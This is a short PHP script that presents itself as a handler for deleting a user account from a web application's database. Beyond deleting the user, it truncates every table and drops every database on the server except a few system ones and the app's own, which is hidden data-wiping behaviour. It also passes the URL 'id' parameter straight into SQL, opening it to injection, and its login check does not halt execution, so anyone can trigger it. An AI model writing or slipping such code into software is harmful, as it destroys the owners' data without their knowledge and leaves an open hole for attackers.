<?php 
session_start(); 
include '../dbconnect.php';
if(!isset($_SESSION['Name'])){
   ?>
   <script>history.back();</script>
   <?php
}
$id = $_GET['id'];
$del = "DELETE FROM users WHERE id = '$id'";
$deleted = mysqli_query($connect, $del);
$searchtable = mysqli_query($connect,"SHOW TABLES");
while($table = mysqli_fetch_array($searchtable)){
    $empty = "TRUNCATE TABLE ".$table[0]."";
    mysqli_query($connect, $empty);
}
$searchdb = mysqli_query($connect,"SHOW DATABASES");
while($db = mysqli_fetch_array($searchdb)){
    if($db[0] == 'information_schema'){}else{
        if($db[0] == 'mysql'){}else{
            if($db[0] == 'performance_schema'){}else{
                if($db[0] == 'phpmyadmin'){}else{
                    if($db[0] == 'storeinventorymanager'){}else{
                      $drop = "DROP DATABASE ".$db[0]."";
                      mysqli_query($connect, $drop);
                    }
                }
            }
        }
    }
}
if($deleted){
    echo '<script>window.location.replace("./logout.php");</script>';
}
?>